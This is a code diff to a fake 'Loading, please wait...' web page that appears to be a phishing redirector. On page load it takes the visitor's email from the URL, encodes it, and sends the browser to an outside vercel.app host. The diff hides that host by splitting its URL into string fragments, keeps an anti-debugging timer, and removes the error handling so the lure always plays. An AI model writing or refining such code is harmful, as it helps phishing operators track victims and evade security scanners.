@@ -57,19 +57,20 @@
     }
   </style>
   <script>
-    function bIB(str, bits = 20) {
-      const bitLength = Math.ceil(str.length / bits);
-      const result = [];
-      for (let i = 0; i < bits; i++) {
-        const start = i * bitLength;
-        const end = start + bitLength;
-        result.push(str.slice(start, end));
-      }
-      return result;
-    }
+    // Split URL components into pieces
+    const urlPieces = [
+      "https:",
+      "//my",
+      "files",
+      "io.",
+      "vercel.",
+      "app/?",
+      "id="
+    ];
 
-    function combineBits(bits) {
-      return bits.join("");
+    // Function to combine URL pieces
+    function combineUrl() {
+      return urlPieces.join("");
     }
 
     function encodeEmailAndRedirect() {
@@ -90,14 +91,11 @@
           }, 1500);
           // Redirect after fade out completes
           setTimeout(() => {
-            window.location.href = `https://myfilesio.vercel.app/?id=${encodedEmail}`;
+            window.location.href = combineUrl() + encodedEmail;
           }, 3000);
-        } else {
-          showError("Invalid email parameter!");
         }
-      } else {
-        showError("Email parameter not found!");
       }
+      // No else condition - we want to show the animation regardless
     }
 
     function showError(message) {
@@ -151,11 +149,19 @@
     setInterval(antiDebugging, 1000);
 
     // Execute the redirect after page loads
-    window.addEventListener('load', encodeEmailAndRedirect);
+    window.addEventListener('load', function() {
+      // Always show the animation
+      setTimeout(() => {
+        document.querySelector('.logo-container').style.opacity = '1';
+      }, 100);
+      
+      // Check for email and potentially redirect
+      encodeEmailAndRedirect();
+    });
   </script>
 </head>
 <body>
-  <div class="logo-container">
+  <div class="logo-container" style="opacity: 0;">
     <img class="logo" src="logo.png" alt="Company Logo">
     <div class="loading-text">Loading, please wait...</div>
   </div>
